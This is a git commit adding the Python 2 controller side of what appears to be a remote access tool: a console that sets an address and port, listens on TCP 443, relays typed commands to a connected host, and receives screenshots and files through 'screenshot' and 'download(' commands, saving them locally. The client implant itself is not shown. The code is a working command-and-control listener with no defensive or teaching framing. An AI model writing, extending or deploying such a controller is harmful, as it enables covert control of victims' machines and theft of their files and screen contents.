48c96e0b7a658b5f50c41e9fae2fd2bc08022c89
Marek Sabov <Marek Sabov>
2017-02-12 22:38:52 +0100

    fist version

---
+++ Listener.py
@@ -0,0 +1,48 @@
+#!/usr/bin/python
+import ListenerClass, os, signal
+
+
+notConnected = True
+started = False
+listener = ListenerClass.listener()
+os.system('cls' if os.name=='nt' else 'clear')
+print "***************************************"
+print "***************LISTENER****************"
+print "***************************************"
+
+
+while True:
+    if notConnected and started:
+        try:
+            notConnected = False
+            listener.start()
+            notConnected = True
+        except:
+            notConnected = True
+    console = raw_input()
+
+    if console == "start":
+        started = True
+    elif console == "stop":
+        started = False
+    elif console == "options":
+        print "Set ipaddress:"
+        ip = raw_input()
+        print "set port:"
+        port = int(raw_input())
+        print "Listener configurated successfully."
+        listener.setOptions(ip,port)
+    elif console == "clear":
+        os.system('cls' if os.name == 'nt' else 'clear')
+        print "***************************************"
+        print "***************LISTENER****************"
+        print "***************************************"
+    elif console == "exit":
+        if notConnected or not started:
+            os._exit(0)
+    elif console == "^X":
+        print "test"
+    def sigint_handler(signum, frame):
+        print 'Stop pressing the CTRL+C!'
+
+    signal.signal(signal.SIGINT, sigint_handler)
---
+++ ListenerClass.py
@@ -0,0 +1,72 @@
+import socket, os
+
+class listener(object):
+    TCP_IP = '127.0.0.1'
+    PORT = 443
+    BUFFER_SIZE = 4096 * 2  # Normally 1024, but we want fast response
+
+    def start(self):
+        print "Listener Started"
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+        s.bind((self.TCP_IP, self.PORT))
+
+        s.listen(5)
+        connection, address = s.accept()
+
+        while True:
+            buf = connection.recv(self.BUFFER_SIZE)
+            if len(buf) > 0:
+                print buf
+                buf = ""
+                resp = raw_input() + "\n"
+
+                if resp == "exit\n":
+                    connection.sendall("quit\n")
+                    connection.close()
+                    os._exit(0)
+                elif resp == "screenshot\n":
+                    connection.sendall(resp)
+                    data = connection.recv(4096)
+                    print data
+                    name = data[7:-8]
+                    data = ""
+                    while "finish" not in data:
+                        data += connection.recv(150)
+                    data = data[:-7]
+
+                    fh = open(name, "wb")
+                    # fh.write(data.decode('base64'))
+                    fh.write(data)
+                    fh.close()
+
+                    resp = raw_input() + "\n"
+                    connection.sendall(resp)
+
+                elif resp.startswith("download("):
+                    connection.sendall(resp)
+                    data = connection.recv(4096)
+                    print data
+                    if "does not exists" not in data:
+                        name = data[12:-3]
+                        data = ""
+                        while "finish" not in data:
+                            data += connection.recv(150)
+                        data = data[:-7]
+
+                        fh = open(name, "wb")
+                        fh.write(data)
+                        fh.close()
+                        print name+" successfully downloaded."
+
+                    resp = raw_input()+"\n"
+                    connection.sendall(resp)
+
+                else:
+                    connection.sendall(resp)
+            else:
+                print "0"
+
+    def setOptions(self,ipAddress,port):
+        self.TCP_IP = ipAddress
+        self.PORT = port
